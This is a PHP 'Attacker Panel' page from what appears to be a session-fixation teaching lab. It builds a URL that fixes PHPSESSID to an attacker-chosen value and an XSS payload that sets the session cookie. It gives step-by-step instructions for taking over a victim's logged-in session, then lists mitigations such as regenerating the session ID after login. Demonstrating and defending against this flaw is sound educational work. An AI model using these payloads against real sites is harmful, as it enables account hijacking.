<?php
session_start();

// Generate a new session ID for the attack
$attack_session_id = session_create_id();

// Craft malicious payloads
$url_attack = "index.php?PHPSESSID=" . $attack_session_id;
$xss_attack = "<script>document.cookie = 'PHPSESSID=" . $attack_session_id . "; path=/';</script>";
$encoded_xss = htmlspecialchars($xss_attack);
$xss_url = "index.php?message=" . urlencode($xss_attack);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Attacker Panel - Session Fixation POC</title>
    <style>
        a{ color:rgb(255, 255, 255); text-decoration: none; }
    </style>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Attacker Panel</h1>
        
        <div class="nav">
            <a href="index.php">Home</a>
            <a href="attacker.php">Attacker Panel</a>
        </div>
        
        <div style="margin-bottom: 20px; padding: 10px; background-color: #f8f9fa; border-left: 5px solid #dc3545; border-radius: 3px;">
            <strong>Warning:</strong> This is for educational purposes only. Do not use these techniques against real websites unless you have permission.
        </div>
        
        <h2>Session Fixation Attack</h2>
        <p>Generated Session ID for attack: <strong><?php echo $attack_session_id; ?></strong></p>
        
        <div class="attack-section">
            <h3>Attack Vector 1: URL-based Session Fixation</h3>
            <p>This attack works by sending a link with a predefined session ID to the victim.</p>
            
            <p><strong>Attack URL:</strong></p>
            <div class="code">
                <a href="<?php echo htmlspecialchars($url_attack); ?>" target="_blank"><?php echo htmlspecialchars($url_attack); ?></a>
            </div>
            
            <h4>Attack Steps:</h4>
            <ol>
                <li>Send the above URL to the victim</li>
                <li>Victim clicks the link which sets their session ID to the attacker-controlled one</li>
                <li>Victim logs in, maintaining the same session ID</li>
                <li>Attacker can now use the same session ID to access the victim's account</li>
            </ol>
        </div>
        
        <div class="attack-section">
            <h3>Attack Vector 2: XSS-based Session Fixation</h3>
            <p>This attack uses XSS to set the session cookie via JavaScript.</p>
            
            <p><strong>XSS Payload:</strong></p>
            <div class="code">
                <?php echo $encoded_xss; ?>
            </div>

            <p><strong>XSS Attack URL:</strong></p>
            <div class="code">
                <a href="<?php echo htmlspecialchars($xss_url); ?>" target="_blank"><?php echo htmlspecialchars($xss_url); ?></a>
            </div>
            
            <h4>Attack Steps:</h4>
            <ol>
                <li>Send the XSS URL to the victim</li>
                <li>When victim visits the page, the JavaScript sets their session cookie</li>
                <li>Victim logs in, maintaining the same session ID</li>
                <li>Attacker can now use the same session ID to access the victim's account</li>
            </ol>
        </div>
        
        <div class="attack-section">
            <h3>Session Takeover</h3>
            <p>After the victim logs in using the fixed session, the attacker can access their account by using the same session ID.</p>
            
            <p><strong>Steps to demonstrate takeover:</strong></p>
            <ol>
                <li>Use one of the attack vectors above to set a victim's session ID</li>
                <li>Have the victim log in (either as admin or regular user)</li>
                <li>In another browser (or incognito window), manually set your cookie to: <code>PHPSESSID=<?php echo $attack_session_id; ?></code></li>
                <li>Visit any page on the site - you'll have access to the victim's session</li>
            </ol>
        </div>
        
        <div class="info">
            <h3>Mitigation Techniques:</h3>
            <ol>
                <li>Regenerate session IDs after login: <code>session_regenerate_id(true);</code></li>
                <li>Validate session IDs against a database of issued sessions</li>
                <li>Bind sessions to IP addresses or user agents (with caution)</li>
                <li>Set the session cookie with secure attributes (HttpOnly, Secure, SameSite)</li>
                <li>Sanitize all user input to prevent XSS</li>
                <li>Never accept session IDs from URLs or GET parameters</li>
            </ol>
        </div>
    </div>
</body>
</html>